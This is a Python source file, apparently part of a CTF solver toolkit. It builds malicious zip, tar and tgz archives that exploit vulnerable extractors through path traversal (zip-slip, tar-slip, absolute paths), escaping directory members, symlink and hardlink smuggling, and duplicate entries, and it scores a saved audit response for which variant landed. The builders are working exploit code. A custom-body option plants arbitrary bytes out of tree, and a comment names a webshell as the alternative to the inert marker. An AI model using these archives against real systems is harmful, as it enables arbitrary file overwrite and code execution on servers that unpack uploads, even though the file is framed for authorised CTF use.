#!/usr/bin/env python3
"""Offline archive-smuggling candidate builder and audit-endpoint win reader.

This hand tool builds *synthetic* malicious archives (bytes and metadata) for a
player to replay against the squad's one assigned CTF target, and reads a saved
audit-endpoint response to tell which smuggled entry landed.  It never opens a
socket, imports the live web client, submits a flag, guesses a target, or
*unpacks* an archive.  Every archive it emits is built here from the standard
library.  Extraction is the target's job, not this tool's: nothing here calls
``extractall`` or follows a link.

The planted body is an inert marker string by default.  A replay usually needs
real bytes instead - the cited solve (a validate-then-promote pipeline) won by
planting the *validated original* file into the write-protected trusted
directory - so every builder also takes ``body=`` (CLI ``--body-file``): the
caller's bytes then go verbatim into the escaping entry, and the variant is
flagged ``custom_body`` (no longer inert) with the body's sha256 recorded so the
audit reader can recognise it.

Where ``upload_builder`` and ``upload_lfi_catalog`` stop at single-file upload
and single-path traversal, this module covers the archive-extraction primitives
that a vulnerable unzip/untar sink exposes:

* **zip-slip / tar-slip** - an entry whose name escapes the extraction root with
  ``../`` (or an absolute path), so the file is written outside the sandbox;
* **directory members** - an escaping *directory* entry followed by a file
  inside it, for extractors that create directories before checking names;
* **symlink smuggling** - a symlink entry pointing at an out-of-tree target, so a
  later regular entry resolves through the link;
* **hardlink smuggling** (tar/tgz only) - a hardlink entry aliasing an
  out-of-tree file, then a regular entry of the same name that a naive
  extractor writes *through* the link (the overwrite primitive);
* **duplicate-entry confusion** - two entries with the same name, so the
  validating pass and the writing pass disagree about which body wins.

Tar variants come as plain ``tar`` and/or gzip-compressed ``tgz``.

Each built variant plants a unique marker token (or the caller's body, whose
sha256 is recorded) in a predictable landing path.  After the operator replays
one archive through the scope-locked ``WebClient`` (``solvers/toolkits/web.py``)
and saves the audit endpoint's response, :func:`read_audit_markers` reads that
saved text (offline, bounded) and reports the win evidence.  A marker hit names
exactly one variant.  A landing-path or body-digest hit cannot say which
primitive landed (every variant aimed at the same target shares them), so it is
reported once, as a shared hit listing its candidate variants, and flagged
``ambiguous`` when more than one variant could have produced it.

Examples::

    .venv/bin/python solvers/web/archive_smuggle.py --target tmp/pwn.php --depth 5
    .venv/bin/python solvers/web/archive_smuggle.py --select 2 --output evil.zip
    .venv/bin/python solvers/web/archive_smuggle.py --body-file original.bin --tar-formats tar,tgz --json
"""

from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import io
import json
import re
import sys
import tarfile
import warnings
import zipfile
from dataclasses import dataclass
from pathlib import Path


MAX_DEPTH = 16
MAX_TARGET = 512
MAX_VARIANTS = 64
MAX_BODY = 8 << 20          # 8 MiB: a config/table file, not a disk image
MAX_AUDIT_TEXT = 1 << 20    # 1 MiB of saved audit response is plenty for a listing
MAX_MARKERS = 256

# A short inert body.  An archive that lands this instead of a webshell proves
# the extraction primitive without shipping executable content.
MARKER_PREFIX = "ARCHV_SMUGGLE_MARKER"
_DEFAULT_MARKER_STEM = "r5d"
# Pinned so the built bytes (and therefore pytest's collected ids) never carry a
# wall clock.  DOS epoch for zip, Unix epoch 0 for tar and gzip.
_ZIP_DATE = (1980, 1, 1, 0, 0, 0)
_NAME_RE = re.compile(r"^[A-Za-z0-9_]{1,32}$")
_TAR_FORMATS = ("tar", "tgz")
PRIMITIVES = ("zip_slip", "dir_member", "symlink", "hardlink", "duplicate_entry")


class ArchiveSmuggleError(ValueError):
    """Raised when an archive-smuggle input is malformed or over a fixed bound."""


@dataclass(frozen=True, slots=True)
class ArchiveVariant:
    """One built malicious archive and the evidence needed to read its outcome."""

    rank: int
    name: str
    archive_format: str          # "zip" | "tar" | "tgz"
    primitive: str               # one of PRIMITIVES
    entry_names: tuple[str, ...]
    landing_path: str            # where the smuggled body is predicted to land
    marker: str                  # unique token; planted in the body unless custom_body
    content: bytes               # the full archive bytes (synthetic)
    requirements: tuple[str, ...]
    reason: str
    body_sha256: str = ""        # sha256 of the planted (escaping) body
    custom_body: bool = False    # True when the caller supplied the body bytes

    @property
    def size(self) -> int:
        return len(self.content)

    @property
    def sha256(self) -> str:
        return hashlib.sha256(self.content).hexdigest()

    def to_dict(self, *, include_bytes: bool = False) -> dict[str, object]:
        row: dict[str, object] = {
            "rank": self.rank,
            "name": self.name,
            "archive_format": self.archive_format,
            "primitive": self.primitive,
            "entry_names": list(self.entry_names),
            "landing_path": self.landing_path,
            "marker": self.marker,
            "size": self.size,
            "sha256": self.sha256,
            "body_sha256": self.body_sha256,
            "custom_body": self.custom_body,
            "requirements": list(self.requirements),
            "reason": self.reason,
            # A caller-supplied body is whatever the caller chose; only the
            # default marker body is known to be inert.
            "inert": not self.custom_body,
            "offline": True,
            "network_requests": 0,
        }
        if include_bytes:
            row["content_b64"] = base64.b64encode(self.content).decode("ascii")
        return row


@dataclass(frozen=True, slots=True)
class AuditHit:
    """One piece of win evidence found in a saved audit-endpoint response.

    ``via == "marker"``: the variant's unique marker surfaced, so
    ``candidates`` is exactly that one variant.  ``via`` of ``"landing_path"``
    or ``"body_sha256"``: shared evidence, reported once for every variant that
    could have produced it; when more than one could, ``ambiguous`` is True and
    ``variant_name``/``marker`` are empty because the primitive is unknown.
    """

    variant_name: str
    primitive: str
    marker: str
    landing_path: str
    offset: int
    via: str                     # "marker" | "landing_path" | "body_sha256"
    candidates: tuple[str, ...] = ()
    ambiguous: bool = False

    def to_dict(self) -> dict[str, object]:
        return {
            "variant_name": self.variant_name,
            "primitive": self.primitive,
            "marker": self.marker,
            "landing_path": self.landing_path,
            "offset": self.offset,
            "via": self.via,
            "candidates": list(self.candidates),
            "ambiguous": self.ambiguous,
        }


def _depth(value: int) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 1 <= value <= MAX_DEPTH:
        raise ArchiveSmuggleError(f"depth must be an integer from 1 to {MAX_DEPTH}")
    return value


def _target(value: str) -> str:
    """Normalize the out-of-tree file name the smuggled body should become.

    The result is a clean relative path (no ``..`` segments, no leading slash);
    the traversal is added by the builder, never taken from the caller.
    """
    if not isinstance(value, str) or not value or len(value) > MAX_TARGET:
        raise ArchiveSmuggleError(f"target must contain 1..{MAX_TARGET} characters")
    if any(ord(char) < 0x20 for char in value) or any(char in value for char in "\x00?#"):
        raise ArchiveSmuggleError("target contains a control or URL-delimiter byte")
    clean = value.replace("\\", "/").lstrip("/")
    segments = [seg for seg in clean.split("/") if seg not in ("", ".")]
    if not segments or any(seg == ".." for seg in segments):
        raise ArchiveSmuggleError("target must name a normalized relative file")
    return "/".join(segments)


def _marker_stem(value: str) -> str:
    if not isinstance(value, str) or not _NAME_RE.fullmatch(value):
        raise ArchiveSmuggleError("marker stem must be 1..32 chars of [A-Za-z0-9_]")
    return value


def _marker(stem: str, primitive: str, target: str) -> str:
    digest = hashlib.sha256(f"{stem}|{primitive}|{target}".encode("utf-8")).hexdigest()[:12]
    return f"{MARKER_PREFIX}_{primitive.upper()}_{digest}"


def _custom_body(body: bytes | bytearray | memoryview | None) -> bytes | None:
    if body is None:
        return None
    if not isinstance(body, (bytes, bytearray, memoryview)):
        raise ArchiveSmuggleError("body must be bytes (read a file with --body-file)")
    data = bytes(body)
    if not data:
        raise ArchiveSmuggleError("body is empty; omit it to plant the inert marker instead")
    if len(data) > MAX_BODY:
        raise ArchiveSmuggleError(f"body exceeds {MAX_BODY} bytes")
    return data


def _body(marker: str, custom: bytes | None) -> bytes:
    if custom is not None:
        # Verbatim: a replay of "plant the validated original" must land the
        # exact bytes, so nothing is appended or re-encoded.
        return custom
    # The inert body is the marker itself plus a trailer, so a server that writes
    # the entry verbatim and a server that stores only its name both surface it.
    return f"{marker}\n# inert archive-smuggle probe; no code here\n".encode("utf-8")


def _zip_bytes(entries: list[tuple[zipfile.ZipInfo, bytes]]) -> bytes:
    bio = io.BytesIO()
    # STORED keeps the bytes free of zlib-version drift so collected test ids are
    # stable across machines and Python builds.
    with zipfile.ZipFile(bio, "w", compression=zipfile.ZIP_STORED) as zf, warnings.catch_warnings():
        # A duplicate name is the point of the duplicate-entry variant.
        warnings.filterwarnings("ignore", message="Duplicate name", category=UserWarning)
        for info, data in entries:
            zf.writestr(info, data)
    return bio.getvalue()


def _zip_info(name: str, *, symlink: bool = False, directory: bool = False) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=_ZIP_DATE)
    info.create_system = 3  # Unix, so external_attr carries a unix mode
    if symlink:
        mode = 0o120777
    elif directory:
        mode = 0o040755
    else:
        mode = 0o100644
    info.external_attr = mode << 16
    if directory:
        info.external_attr |= 0x10  # MS-DOS directory bit, as zipfile itself sets
    return info


def _tar_format(value: str) -> str:
    fmt = str(value).lower()
    if fmt not in _TAR_FORMATS:
        raise ArchiveSmuggleError(f"tar archive_format must be one of {', '.join(_TAR_FORMATS)}")
    return fmt


def _tar_bytes(members: list[tuple[tarfile.TarInfo, bytes | None]], fmt: str = "tar") -> bytes:
    fmt = _tar_format(fmt)
    bio = io.BytesIO()
    # GNU format and a zeroed mtime/owner keep the bytes deterministic.
    with tarfile.open(fileobj=bio, mode="w", format=tarfile.GNU_FORMAT) as tf:
        for info, data in members:
            info.mtime = 0
            info.uid = info.gid = 0
            info.uname = info.gname = ""
            tf.addfile(info, io.BytesIO(data) if data is not None else None)
    raw = bio.getvalue()
    if fmt == "tar":
        return raw
    gz = io.BytesIO()
    # mtime=0 and an empty name keep the gzip header free of clock and path.
    with gzip.GzipFile(filename="", mode="wb", fileobj=gz, mtime=0, compresslevel=9) as fh:
        fh.write(raw)
    return gz.getvalue()


def _tar_reg(name: str, body: bytes) -> tarfile.TarInfo:
    info = tarfile.TarInfo(name)
    info.size = len(body)
    return info


def _traversal_prefix(depth: int) -> str:
    return "../" * depth


def _variant(name: str, archive_format: str, primitive: str, entry_names: tuple[str, ...],
             landing: str, marker: str, content: bytes, requirement: str, reason: str,
             body: bytes, custom: bytes | None) -> ArchiveVariant:
    return ArchiveVariant(
        0, name, archive_format, primitive, entry_names, landing, marker, content,
        (requirement,), reason,
        body_sha256=hashlib.sha256(body).hexdigest(), custom_body=custom is not None,
    )


def build_zip_slip(target: str, *, depth: int = 6, marker_stem: str = _DEFAULT_MARKER_STEM,
                   body: bytes | None = None) -> ArchiveVariant:
    """A zip whose single entry name escapes the extraction root with ``../``."""

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    marker = _marker(stem, "zip_slip", clean)
    name = _traversal_prefix(depth) + clean
    data = _body(marker, custom)
    content = _zip_bytes([(_zip_info(name), data)])
    return _variant(
        "zip_slip", "zip", "zip_slip", (name,), clean, marker, content,
        "the extractor writes entry names without confining them to the output root",
        "zip entry name traverses out of the extraction directory", data, custom,
    )


def build_zip_absolute(target: str, *, marker_stem: str = _DEFAULT_MARKER_STEM,
                       body: bytes | None = None) -> ArchiveVariant:
    """A zip whose entry name is an absolute path."""

    clean = _target(target)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    marker = _marker(stem, "zip_absolute", clean)
    name = "/" + clean
    data = _body(marker, custom)
    content = _zip_bytes([(_zip_info(name), data)])
    return _variant(
        "zip_absolute", "zip", "zip_slip", (name,), clean, marker, content,
        "the extractor honours an absolute entry name instead of rebasing it",
        "zip entry name is absolute, bypassing the output root entirely", data, custom,
    )


def _dir_slip_names(clean: str, depth: int) -> tuple[str, str]:
    target_dir, _, leaf = clean.rpartition("/")
    dir_name = _traversal_prefix(depth) + (target_dir + "/" if target_dir else "")
    return dir_name, dir_name + leaf


def build_dir_slip(target: str, *, archive_format: str = "zip", depth: int = 6,
                   marker_stem: str = _DEFAULT_MARKER_STEM, body: bytes | None = None) -> ArchiveVariant:
    """An escaping *directory* member, then a regular file inside it.

    Some extractors create directory entries before (or without) checking their
    names and only validate file entries against the directory they already
    made; the file then lands in the out-of-tree directory.
    """

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    fmt = str(archive_format).lower()
    if fmt not in ("zip",) + _TAR_FORMATS:
        raise ArchiveSmuggleError("archive_format must be 'zip', 'tar' or 'tgz'")
    marker = _marker(stem, f"dir_member_{fmt}", clean)
    dir_name, file_name = _dir_slip_names(clean, depth)
    data = _body(marker, custom)
    if fmt == "zip":
        content = _zip_bytes([(_zip_info(dir_name, directory=True), b""), (_zip_info(file_name), data)])
    else:
        dir_info = tarfile.TarInfo(dir_name.rstrip("/"))
        dir_info.type = tarfile.DIRTYPE
        dir_info.mode = 0o755
        content = _tar_bytes([(dir_info, None), (_tar_reg(file_name, data), data)], fmt)
    return _variant(
        f"{fmt}_dir_slip", fmt, "dir_member", (dir_name, file_name), clean, marker, content,
        "the extractor creates directory members without confining them to the output root",
        "an escaping directory member is created, then a file is written inside it", data, custom,
    )


def build_zip_symlink(target: str, *, link_name: str = "link", depth: int = 6,
                      marker_stem: str = _DEFAULT_MARKER_STEM, body: bytes | None = None) -> ArchiveVariant:
    """A zip with a symlink entry pointing out of tree, then a write through it.

    First entry: a symlink ``link_name`` -> ``../../target_dir``.  Second entry:
    a regular file ``link_name/leaf`` carrying the body, so an extractor that
    creates the link and then writes the second entry lands the body at the
    symlink's target.
    """

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    marker = _marker(stem, "symlink", clean)
    target_dir, _, leaf = clean.rpartition("/")
    link_dir_target = _traversal_prefix(depth) + (target_dir or ".")
    link_info = _zip_info(link_name, symlink=True)
    write_name = f"{link_name}/{leaf}"
    data = _body(marker, custom)
    entries = [
        (link_info, link_dir_target.encode("utf-8")),
        (_zip_info(write_name), data),
    ]
    content = _zip_bytes(entries)
    return _variant(
        "zip_symlink", "zip", "symlink", (link_name, write_name), clean, marker, content,
        "the extractor creates symlink entries and then writes through them",
        "symlink entry redirects a later regular write out of tree", data, custom,
    )


def build_tar_slip(target: str, *, depth: int = 6, marker_stem: str = _DEFAULT_MARKER_STEM,
                   body: bytes | None = None, archive_format: str = "tar") -> ArchiveVariant:
    """A tar/tgz whose single member name escapes the extraction root with ``../``."""

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    fmt = _tar_format(archive_format)
    marker = _marker(stem, f"{fmt}_slip", clean)
    name = _traversal_prefix(depth) + clean
    data = _body(marker, custom)
    content = _tar_bytes([(_tar_reg(name, data), data)], fmt)
    return _variant(
        f"{fmt}_slip", fmt, "zip_slip", (name,), clean, marker, content,
        "the extractor writes member names without confining them to the output root",
        "tar member name traverses out of the extraction directory", data, custom,
    )


def build_tar_symlink(target: str, *, link_name: str = "link", depth: int = 6,
                      marker_stem: str = _DEFAULT_MARKER_STEM, body: bytes | None = None,
                      archive_format: str = "tar") -> ArchiveVariant:
    """A tar/tgz with a symlink member out of tree, then a write through it."""

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    fmt = _tar_format(archive_format)
    marker = _marker(stem, f"{fmt}_symlink", clean)
    target_dir, _, leaf = clean.rpartition("/")
    link_info = tarfile.TarInfo(link_name)
    link_info.type = tarfile.SYMTYPE
    link_info.linkname = _traversal_prefix(depth) + (target_dir or ".")
    link_info.size = 0
    write_name = f"{link_name}/{leaf}"
    data = _body(marker, custom)
    content = _tar_bytes([(link_info, None), (_tar_reg(write_name, data), data)], fmt)
    return _variant(
        f"{fmt}_symlink", fmt, "symlink", (link_name, write_name), clean, marker, content,
        "the extractor creates symlink members and then writes through them",
        "tar symlink member redirects a later regular write out of tree", data, custom,
    )


def build_tar_hardlink(target: str, *, link_name: str = "alias", depth: int = 6,
                       marker_stem: str = _DEFAULT_MARKER_STEM, body: bytes | None = None,
                       archive_format: str = "tar", write_through: bool = True) -> ArchiveVariant:
    """A tar/tgz hardlink member aliasing an out-of-tree file, then a write through it.

    First member: hardlink ``link_name`` -> ``../`` * depth + target.  A
    vulnerable extractor resolves the link target without confining it, so the
    alias names the trusted out-of-tree file.  With ``write_through`` (default) a
    second, regular member of the same name carries the body: an extractor that
    opens the existing alias for writing (rather than unlinking it first)
    overwrites the out-of-tree file through the link.
    """

    clean = _target(target)
    depth = _depth(depth)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    fmt = _tar_format(archive_format)
    marker = _marker(stem, f"{fmt}_hardlink", clean)
    link = tarfile.TarInfo(link_name)
    link.type = tarfile.LNKTYPE
    link.linkname = _traversal_prefix(depth) + clean
    link.size = 0
    data = _body(marker, custom)
    members: list[tuple[tarfile.TarInfo, bytes | None]] = [(link, None)]
    names: tuple[str, ...] = (link_name,)
    if write_through:
        members.append((_tar_reg(link_name, data), data))
        names = (link_name, link_name)
        requirement = ("the extractor resolves hardlink targets without confining them and then "
                       "writes a same-named member through the link without unlinking it")
    else:
        requirement = "the extractor resolves hardlink targets without confining them to the root"
    content = _tar_bytes(members, fmt)
    return _variant(
        f"{fmt}_hardlink", fmt, "hardlink", names, clean, marker, content, requirement,
        "tar hardlink member aliases an out-of-tree file" + (" and overwrites it" if write_through else ""),
        data, custom,
    )


def build_duplicate_entry(target: str, *, archive_format: str = "zip",
                          marker_stem: str = _DEFAULT_MARKER_STEM,
                          body: bytes | None = None) -> ArchiveVariant:
    """Two entries with the same name; the second body is the marker (or ``body``).

    A validating pass may inspect the first (benign) entry while the writing pass
    keeps the last one, so the second body wins.
    """

    clean = _target(target)
    stem = _marker_stem(marker_stem)
    custom = _custom_body(body)
    fmt = str(archive_format).lower()
    if fmt not in ("zip",) + _TAR_FORMATS:
        raise ArchiveSmuggleError("archive_format must be 'zip', 'tar' or 'tgz'")
    marker = _marker(stem, f"duplicate_{fmt}", clean)
    leaf = clean.rsplit("/", 1)[-1]
    benign = b"# benign first copy inspected by a validating pass\n"
    winner = _body(marker, custom)
    if fmt == "zip":
        content = _zip_bytes([(_zip_info(leaf), benign), (_zip_info(leaf), winner)])
    else:
        content = _tar_bytes([(_tar_reg(leaf, benign), benign), (_tar_reg(leaf, winner), winner)], fmt)
    return _variant(
        f"duplicate_entry_{fmt}", fmt, "duplicate_entry", (leaf, leaf), leaf, marker, content,
        "the validating pass and the writing pass disagree on which duplicate wins",
        "duplicate entry name: the last body overwrites the inspected first one", winner, custom,
    )


def _builders(target: str, depth: int, stem: str, body: bytes | None,
              tar_formats: tuple[str, ...]) -> dict[str, list]:
    # Lambdas look the builders up at call time, so the table always uses the
    # module's current functions.
    out: dict[str, list] = {
        "zip_slip": [
            lambda: build_zip_slip(target, depth=depth, marker_stem=stem, body=body),
            lambda: build_zip_absolute(target, marker_stem=stem, body=body),
        ],
        "dir_member": [
            lambda: build_dir_slip(target, archive_format="zip", depth=depth, marker_stem=stem, body=body),
        ],
        "symlink": [
            lambda: build_zip_symlink(target, depth=depth, marker_stem=stem, body=body),
        ],
        "hardlink": [],
        "duplicate_entry": [
            lambda: build_duplicate_entry(target, archive_format="zip", marker_stem=stem, body=body),
        ],
    }
    for fmt in tar_formats:
        out["zip_slip"].append(
            lambda fmt=fmt: build_tar_slip(target, depth=depth, marker_stem=stem, body=body, archive_format=fmt))
        out["dir_member"].append(
            lambda fmt=fmt: build_dir_slip(target, archive_format=fmt, depth=depth, marker_stem=stem, body=body))
        out["symlink"].append(
            lambda fmt=fmt: build_tar_symlink(target, depth=depth, marker_stem=stem, body=body, archive_format=fmt))
        out["hardlink"].append(
            lambda fmt=fmt: build_tar_hardlink(target, depth=depth, marker_stem=stem, body=body, archive_format=fmt))
        out["duplicate_entry"].append(
            lambda fmt=fmt: build_duplicate_entry(target, archive_format=fmt, marker_stem=stem, body=body))
    return out


def build_archive_variants(*, target: str = "tmp/r5d_probe", depth: int = 6,
                           marker_stem: str = _DEFAULT_MARKER_STEM,
                           primitives: tuple[str, ...] | list[str] = PRIMITIVES,
                           max_variants: int = MAX_VARIANTS,
                           body: bytes | None = None,
                           tar_formats: tuple[str, ...] | list[str] = ("tar",)) -> tuple[ArchiveVariant, ...]:
    """Return a ranked, bounded tuple of built malicious-archive variants.

    ``primitives`` chooses families and ``tar_formats`` the tar spellings
    (``tar`` and/or ``tgz``); unknown names fail loudly.  ``body`` replaces the
    inert marker body in every variant's escaping entry.  At most
    ``max_variants`` are returned; byte-identical archives are kept once.
    """

    if isinstance(max_variants, bool) or not isinstance(max_variants, int) \
            or not 1 <= max_variants <= MAX_VARIANTS:
        raise ArchiveSmuggleError(f"max_variants must be an integer 1..{MAX_VARIANTS}")
    chosen: list[str] = []
    for value in primitives:
        key = str(value).strip().lower()
        if key not in PRIMITIVES:
            raise ArchiveSmuggleError(f"unknown primitive {value!r}; choose {', '.join(PRIMITIVES)}")
        if key not in chosen:
            chosen.append(key)
    if not chosen:
        raise ArchiveSmuggleError("at least one primitive is required")
    formats: list[str] = []
    for value in tar_formats:
        fmt = _tar_format(str(value).strip())
        if fmt not in formats:
            formats.append(fmt)
    if not formats and "hardlink" in chosen:
        raise ArchiveSmuggleError("the hardlink primitive needs a tar format (tar or tgz)")
    custom = _custom_body(body)
    table = _builders(target, depth, marker_stem, custom, tuple(formats))

    out: list[ArchiveVariant] = []
    seen: set[str] = set()
    for primitive in chosen:
        for make in table[primitive]:
            if len(out) >= max_variants:
                break
            variant = make()
            if variant.sha256 in seen:
                continue
            seen.add(variant.sha256)
            out.append(ArchiveVariant(
                len(out) + 1, variant.name, variant.archive_format, variant.primitive,
                variant.entry_names, variant.landing_path, variant.marker, variant.content,
                variant.requirements, variant.reason,
                body_sha256=variant.body_sha256, custom_body=variant.custom_body,
            ))
    return tuple(out)


def _audit_text(raw: str | bytes | bytearray | memoryview) -> str:
    if isinstance(raw, str):
        text = raw
        size = len(text.encode("utf-8", "surrogatepass"))
    elif isinstance(raw, (bytes, bytearray, memoryview)):
        data = bytes(raw)
        size = len(data)
        text = data.decode("utf-8", "replace")
    else:
        raise ArchiveSmuggleError("saved audit response must be text or bytes")
    if size > MAX_AUDIT_TEXT:
        raise ArchiveSmuggleError(f"saved audit response exceeds {MAX_AUDIT_TEXT} bytes")
    return text


def _find_landing(text: str, landing_path: str) -> int:
    """Offset of a delimiter-bounded mention of the *full* landing path, or -1.

    Only a path with a directory part is matched: a bare file name is what the
    upload form echoes back and what a benign duplicate copy is called, so it
    proves nothing about where a body landed.
    """
    if "/" not in landing_path:
        return -1
    # "/" is a path boundary, not part of a filename token, so it is allowed on
    # either side; a word char, "." or "-" would make the match part of a larger
    # name, so those are forbidden and a substring of a bigger token never wins.
    pattern = re.compile(r"(?<![\w.-])" + re.escape(landing_path) + r"(?![\w.-])")
    match = pattern.search(text)
    return match.start() if match else -1


def _find_digest(text: str, digest: str) -> int:
    # Audit trails print hashes in either case; a longer hex run is a different hash.
    match = re.search(r"(?<![0-9A-Fa-f])" + re.escape(digest) + r"(?![0-9A-Fa-f])", text, re.IGNORECASE)
    return match.start() if match else -1


def read_audit_markers(saved_audit_text: str | bytes | bytearray | memoryview,
                       variants) -> tuple[AuditHit, ...]:
    """Read a saved audit-endpoint response for win evidence (offline, bounded).

    ``variants`` is the tuple :func:`build_archive_variants` returned (or any
    iterable of :class:`ArchiveVariant`).  Each variant whose unique marker
    appears yields one ``via="marker"`` hit naming it.  For the variants whose
    marker did not appear, shared evidence is grouped: a delimiter-bounded
    mention of a full landing path (``via="landing_path"``) or, for a custom
    body, of the body's sha256 (``via="body_sha256"``) yields *one* hit listing
    every variant that could have caused it, ``ambiguous`` when there are
    several.  Hits are ordered by offset in the text.  Nothing is sent.
    """

    text = _audit_text(saved_audit_text)
    rows: list[ArchiveVariant] = list(variants)
    if len(rows) > MAX_MARKERS:
        raise ArchiveSmuggleError(f"variant count exceeds {MAX_MARKERS}")
    hits: list[AuditHit] = []
    seen_markers: set[str] = set()
    explained_landings: set[str] = set()
    explained_bodies: set[str] = set()
    pending: list[ArchiveVariant] = []
    for variant in rows:
        if not isinstance(variant, ArchiveVariant):
            raise ArchiveSmuggleError("each variant must be an ArchiveVariant")
        if variant.marker in seen_markers:
            continue
        seen_markers.add(variant.marker)
        index = text.find(variant.marker)
        if index >= 0:
            hits.append(AuditHit(
                variant.name, variant.primitive, variant.marker, variant.landing_path,
                index, "marker", (variant.name,), False,
            ))
            explained_landings.add(variant.landing_path)
            explained_bodies.add(variant.body_sha256)
        else:
            pending.append(variant)

    # Shared evidence, grouped so one mention is one hit, never one per variant.
    # A marker hit already explains its own landing path and body digest.
    groups: dict[tuple[str, str], list[ArchiveVariant]] = {}
    for variant in pending:
        if variant.landing_path not in explained_landings:
            groups.setdefault(("landing_path", variant.landing_path), []).append(variant)
        if variant.custom_body and variant.body_sha256 and variant.body_sha256 not in explained_bodies:
            groups.setdefault(("body_sha256", variant.body_sha256), []).append(variant)
    for (via, key), group in groups.items():
        index = _find_landing(text, key) if via == "landing_path" else _find_digest(text, key)
        if index < 0:
            continue
        names = tuple(v.name for v in group)
        single = len(group) == 1
        primitives = {v.primitive for v in group}
        landings = {v.landing_path for v in group}
        hits.append(AuditHit(
            names[0] if single else "",
            next(iter(primitives)) if len(primitives) == 1 else "ambiguous",
            group[0].marker if single else "",
            next(iter(landings)) if len(landings) == 1 else "",
            index, via, names, not single,
        ))
    return tuple(sorted(hits, key=lambda hit: (hit.offset, hit.via, hit.candidates)))


def variants_as_dicts(variants, *, include_bytes: bool = False) -> tuple[dict[str, object], ...]:
    out = []
    for variant in variants:
        if not isinstance(variant, ArchiveVariant):
            raise ArchiveSmuggleError("each row must be an ArchiveVariant")
        out.append(variant.to_dict(include_bytes=include_bytes))
    return tuple(out)


def _read_body_file(path: Path) -> bytes:
    # Read as data only (never executed); bounded before the full read.
    size = path.stat().st_size
    if size > MAX_BODY:
        raise ArchiveSmuggleError(f"--body-file exceeds {MAX_BODY} bytes")
    return path.read_bytes()


def _parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="build offline archive-smuggling candidates and read a saved audit response (sends nothing)")
    p.add_argument("--target", default="tmp/r5d_probe",
                   help="relative out-of-tree file the smuggled body should become")
    p.add_argument("--depth", type=int, default=6, help=f"traversal depth (1..{MAX_DEPTH})")
    p.add_argument("--marker-stem", default=_DEFAULT_MARKER_STEM, help="token stem for planted markers")
    p.add_argument("--primitives", default=",".join(PRIMITIVES), help="comma-separated families")
    p.add_argument("--tar-formats", default="tar", help="comma-separated tar spellings: tar, tgz")
    p.add_argument("--body-file", type=Path,
                   help="plant these bytes verbatim instead of the inert marker (e.g. the validated original)")
    p.add_argument("--limit", type=int, default=MAX_VARIANTS, help=f"variant cap (1..{MAX_VARIANTS})")
    p.add_argument("--json", action="store_true", help="print all variants as base64 JSON")
    p.add_argument("--select", type=int, help="select one 1-based variant for --output or display")
    p.add_argument("--output", type=Path, help="write only the selected variant's archive bytes here")
    p.add_argument("--read-audit", type=Path,
                   help="read this saved audit-response file for planted markers (no request is made)")
    return p


def main(argv: list[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        primitives = tuple(x.strip() for x in args.primitives.split(",") if x.strip())
        tar_formats = tuple(x.strip() for x in args.tar_formats.split(",") if x.strip())
        body = _read_body_file(args.body_file) if args.body_file is not None else None
        variants = build_archive_variants(
            target=args.target, depth=args.depth, marker_stem=args.marker_stem,
            primitives=primitives, max_variants=args.limit, body=body, tar_formats=tar_formats)
        if args.read_audit is not None:
            saved = args.read_audit.read_bytes()
            hits = read_audit_markers(saved, variants)
            print(json.dumps({"offline": True, "sent": False,
                              "hits": [hit.to_dict() for hit in hits]}, indent=2, sort_keys=True))
            return 0
        if args.select is not None:
            if not 1 <= args.select <= len(variants):
                raise ArchiveSmuggleError(f"--select must be 1..{len(variants)}")
            variants = variants[args.select - 1:args.select]
        if args.output is not None:
            if args.select is None:
                raise ArchiveSmuggleError("--output requires --select so only one artifact is written")
            args.output.write_bytes(variants[0].content)
            print(json.dumps({"written": str(args.output), "name": variants[0].name,
                              "size": variants[0].size, "sha256": variants[0].sha256,
                              "body_sha256": variants[0].body_sha256,
                              "custom_body": variants[0].custom_body,
                              "offline": True}, sort_keys=True))
            return 0
        if args.json:
            print(json.dumps({"offline": True, "sent": False,
                              "variants": list(variants_as_dicts(variants, include_bytes=True))},
                             indent=2, sort_keys=True))
            return 0
        body_note = "caller-supplied body" if body is not None else "inert marker body"
        print("OFFLINE ONLY - built synthetic malicious archives; no archive was unpacked and no request was sent")
        print(f"planted body: {body_note}")
        print("rank  name                      fmt   primitive        landing                    bytes  sha256")
        for v in variants:
            print(f"{v.rank:>4}  {v.name[:24]:<24}  {v.archive_format:<4}  {v.primitive[:15]:<15}  "
                  f"{v.landing_path[:25]:<25}  {v.size:>5}  {v.sha256[:12]}")
        print("Use --json for base64 bytes, --select N --output FILE for one archive, "
              "or --read-audit FILE to score a saved audit response.")
        return 0
    except (OSError, ValueError) as exc:
        print(f"archive_smuggle: {exc}", file=sys.stderr)
        return 2


__all__ = [
    "PRIMITIVES", "ArchiveSmuggleError", "ArchiveVariant", "AuditHit",
    "build_archive_variants", "build_dir_slip", "build_duplicate_entry", "build_tar_hardlink",
    "build_tar_slip", "build_tar_symlink", "build_zip_absolute", "build_zip_slip",
    "build_zip_symlink", "read_audit_markers", "variants_as_dicts",
]


if __name__ == "__main__":
    raise SystemExit(main())
